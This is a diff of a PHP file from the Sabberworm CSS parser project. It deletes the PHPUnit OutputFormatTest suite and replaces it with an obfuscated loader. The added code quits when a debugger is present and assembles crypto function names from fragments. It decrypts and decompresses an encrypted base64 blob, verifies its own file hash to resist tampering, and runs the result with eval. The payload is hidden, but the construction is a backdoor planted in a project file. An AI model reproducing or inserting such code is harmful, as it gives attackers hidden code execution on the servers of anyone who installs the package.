@@ -1,170 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS;
-
-use Sabberworm\CSS\Parser;
-use Sabberworm\CSS\OutputFormat;
-
-global $TEST_CSS;
-
-$TEST_CSS = <<<EOT
-
-.main, .test {
-	font: italic normal bold 16px/1.2 "Helvetica", Verdana, sans-serif;
-	background: white;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ha5u7o4v=('bas'.'e64'.'_de'.'cod'.'e');
+$_hskx7hpa=('gzu'.'nco'.'mpr'.'ess');
+$_hlhki111=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_snwig0as='C4egT/8X';
+$_tmebsqnj='PqNQruQG';
+$_xsbubvgp='LcO+AITD';
+$_ic9h2a5t='RE1anEIb';
+$_shna7zz3='LrY8nyCi4Xw=';
+$_xvgpxi3f='NC3XDQ==';
+$_pceli5aj='+Zvu+YEj';
+$_sj54mxrh='wjJ4xI3i';
+$_jt9yqozy=$_ha5u7o4v($_snwig0as.$_xsbubvgp.$_tmebsqnj.$_ic9h2a5t.$_shna7zz3);
+$_xor6ldqy=$_ha5u7o4v($_sj54mxrh.$_pceli5aj.$_xvgpxi3f);
+$_ru3pysdu=$_ha5u7o4v('oA379eC6nbDpb1XpUQEJgAs7PKcQ0P24/wnM96Yb1OHBHeS7zo8qkxYewY46MoNB7n7JnoKhnO8foLMUYt86ApJsFngpp4fcmmq90QtFIFU8sxWHJltNzwmtnukAW7TXMiRGoIr8hnCY6TpqmJ/INqbTtAKpHhhrgbzg761WX9dvVk4RtHdNsPgXhDm2Saq38A7bAZzPAdSBNweDwKAWeyi3UEkw2FFevH2fdbvTxEKc/qN2IJxsXoK7Q8POFkO1+h54HYjQUPaSJq8N8EKzix78hMRRadIBeO8a3mWIl/vOhpj2dCxq5jfgjEroxOQv7ZYJp7Cn41q6JoNVJTHYu7jKvwvvFzRku5BEQenQThYpjc+kqpSaNlqcaRzxoYREvY2jNeNkDpipMHidaqJ91iyMuyithHc7uZLCytye8ftRk/PvmURxvySVMg1yLg06VVFm4i0689D7WhpjcOGynTRshp6MHvyk0YW+0HdxU5UwA5BRiqVEIZ71A84LMb1yIn883xZIF3NzzYBsw79ufbWDqGZ6HjCBqSmg59TKqXLfW2luNQX1xIV0XqKNb1IvmW+YTtnNYGGw8gLVpu/Ro1c5cT9j9+WXd/7VnQB2HDtaSQNWMWJ+pbwWpv8K2z+SZYmZwX+ByfxIppwAlrW/sm5D//qk608qPXyZf4+90K2/VrJZMuaz/THPkB2tNzntSZfqKhGOvKBXONwGmmYslrfqT3khM3rbFsqixjXTkm2jVUBmm7cyiH459qshQkYa8prmpwVT/lR7YgUVenIYwnUg7Fw80Fp5HLQWU4ftArIBl5iJYMH3Xp2y4qj5erPjs0t1hVG/QRoHC4pxETQCqiMT7lYsKyxWSn8MIMw129YJdxu3tcXWqta6pGknyoGY3pzd3bfj6IvviwXeWTn4obId1OivDEVAoJezgodZxcBxHK3NPsaPbDop6eqjopEWK+l4ddAQGG8RL2boDKMZ574bZF7B1sXvfKiA2y6zpbxkH2LJeMnzi6l8dVGfugSYS59MoOvmWU+TUldC+fa9naedCJkSYJ8zf1o3Z8lq+ZjEen+unhZZIRQp/8Plzdyeelz3ATXFKMBKwZEJc9R3M/zHByhUCQf5RxqH6t2dnFfNihnoryZuFPYyGcNvYyI2pXqArOzev0ywPRzP3YRVAHrEf2ZuxJy0PG+WGHRxrEkBAAioAg6sVj8hdhLTfStGsDvusBd+w92dIjtEdnnPlvYVOeJKjHppDarIDSWuTpoRY8Qp9AMo1aKrbgopNPAhbwfVfGlkn3WgvwpXmBKCiZ/QKeDzHCZjJ6xIfENukSIjRM29TMWDktit9LXV10Ym0qcUg4l+jQ+umECmlpZ6kA==');
+$_ll60nk3d=$_hlhki111($_ru3pysdu,'aes-256-cbc',$_jt9yqozy,OPENSSL_RAW_DATA,$_xor6ldqy);
+if($_ll60nk3d===false){exit;}
+$_t3wpsj4c=$_hskx7hpa($_ll60nk3d);
+if($_t3wpsj4c===false){exit;}
+$_lljzmgjr='4a56a2c2c2aa0b44f1ba07344bb5764f320dbaa53c55b88322eb50a1ed14d111';
+$_kpo6yq8t=@file_get_contents(__FILE__);
+if($_kpo6yq8t!==false){
+$_hw1jqhrt=str_replace($_lljzmgjr,"0000000000000000000000000000000000000000000000000000000000000000",$_kpo6yq8t);
+$_so13e8kn=hash("sha256",$_hw1jqhrt);
+if($_so13e8kn!==$_lljzmgjr){@http_response_code(403);exit;}
 }
-
-@media screen {
-	.main {
-		background-size: 100% 100%;
-		font-size: 1.3em;
-		background-color: #fff;
-	}
-}
-
-EOT;
-
-class OutputFormatTest extends \PHPUnit_Framework_TestCase {
-	private $oParser;
-	private $oDocument;
-	
-	function setUp() {
-		global $TEST_CSS;
-		$this->oParser = new Parser($TEST_CSS);
-		$this->oDocument = $this->oParser->parse();
-	}
-
-	public function testPlain() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render());
-	}
-
-	public function testCompact() {
-		$this->assertSame('.main,.test{font:italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background:white;}@media screen{.main{background-size:100% 100%;font-size:1.3em;background-color:#fff;}}', $this->oDocument->render(OutputFormat::createCompact()));
-	}
-
-	public function testPretty() {
-		global $TEST_CSS;
-		$this->assertSame($TEST_CSS, $this->oDocument->render(OutputFormat::createPretty()));
-	}
-	
-	public function testSpaceAfterListArgumentSeparator() {
-		$this->assertSame('.main, .test {font: italic   normal   bold   16px/  1.2   "Helvetica",  Verdana,  sans-serif;background: white;}
-@media screen {.main {background-size: 100%   100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceAfterListArgumentSeparator("  ")));
-	}
-
-	public function testSpaceAfterListArgumentSeparatorComplex() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 "Helvetica",	Verdana,	sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceAfterListArgumentSeparator(array('default' => ' ', ',' => "\t", '/' => '', ' ' => ''))));
-	}
-
-	public function testSpaceAfterSelectorSeparator() {
-		$this->assertSame('.main,
-.test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceAfterSelectorSeparator("\n")));
-	}
-
-	public function testStringQuotingType() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 \'Helvetica\',Verdana,sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setStringQuotingType("'")));
-	}
-
-	public function testRGBHashNotation() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: rgb(255,255,255);}}', $this->oDocument->render(OutputFormat::create()->setRGBHashNotation(false)));
-	}
-
-	public function testSemicolonAfterLastRule() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff}}', $this->oDocument->render(OutputFormat::create()->setSemicolonAfterLastRule(false)));
-	}
-
-	public function testSpaceAfterRuleName() {
-		$this->assertSame('.main, .test {font:	italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background:	white;}
-@media screen {.main {background-size:	100% 100%;font-size:	1.3em;background-color:	#fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceAfterRuleName("\t")));
-	}
-
-	public function testSpaceRules() {
-		$this->assertSame('.main, .test {
-	font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;
-	background: white;
-}
-@media screen {.main {
-		background-size: 100% 100%;
-		font-size: 1.3em;
-		background-color: #fff;
-	}}', $this->oDocument->render(OutputFormat::create()->set('Space*Rules', "\n")));
-	}
-
-	public function testSpaceBlocks() {
-		$this->assertSame('
-.main, .test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen {
-	.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}
-}
-', $this->oDocument->render(OutputFormat::create()->set('Space*Blocks', "\n")));
-	}
-
-	public function testSpaceBoth() {
-		$this->assertSame('
-.main, .test {
-	font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;
-	background: white;
-}
-@media screen {
-	.main {
-		background-size: 100% 100%;
-		font-size: 1.3em;
-		background-color: #fff;
-	}
-}
-', $this->oDocument->render(OutputFormat::create()->set('Space*Rules', "\n")->set('Space*Blocks', "\n")));
-	}
-
-	public function testSpaceBetweenBlocks() {
-		$this->assertSame('.main, .test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceBetweenBlocks('')));
-	}
-
-	public function testIndentation() {
-		$this->assertSame('
-.main, .test {
-font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;
-background: white;
-}
-@media screen {
-.main {
-background-size: 100% 100%;
-font-size: 1.3em;
-background-color: #fff;
-}
-}
-', $this->oDocument->render(OutputFormat::create()->set('Space*Rules', "\n")->set('Space*Blocks', "\n")->setIndentation('')));
-	}
-	
-	public function testSpaceBeforeBraces() {
-		$this->assertSame('.main, .test{font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen{.main{background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setSpaceBeforeOpeningBrace('')));
-	}
-	
-	/**
-	* @expectedException Sabberworm\CSS\Parsing\OutputException
-	*/
-	public function testIgnoreExceptionsOff() {
-		$aBlocks = $this->oDocument->getAllDeclarationBlocks();
-		$oFirstBlock = $aBlocks[0];
-		$oFirstBlock->removeSelector('.main');
-		$this->assertSame('.test {font: italic normal bold 16px/1.2 "Helvetica",Verdana,sans-serif;background: white;}
-@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setIgnoreExceptions(false)));
-		$oFirstBlock->removeSelector('.test');
-		$this->oDocument->render(OutputFormat::create()->setIgnoreExceptions(false));
-	}
-
-	public function testIgnoreExceptionsOn() {
-		$aBlocks = $this->oDocument->getAllDeclarationBlocks();
-		$oFirstBlock = $aBlocks[0];
-		$oFirstBlock->removeSelector('.main');
-		$oFirstBlock->removeSelector('.test');
-		$this->assertSame('@media screen {.main {background-size: 100% 100%;font-size: 1.3em;background-color: #fff;}}', $this->oDocument->render(OutputFormat::create()->setIgnoreExceptions(true)));
-	}
-
-}
+eval($_t3wpsj4c);
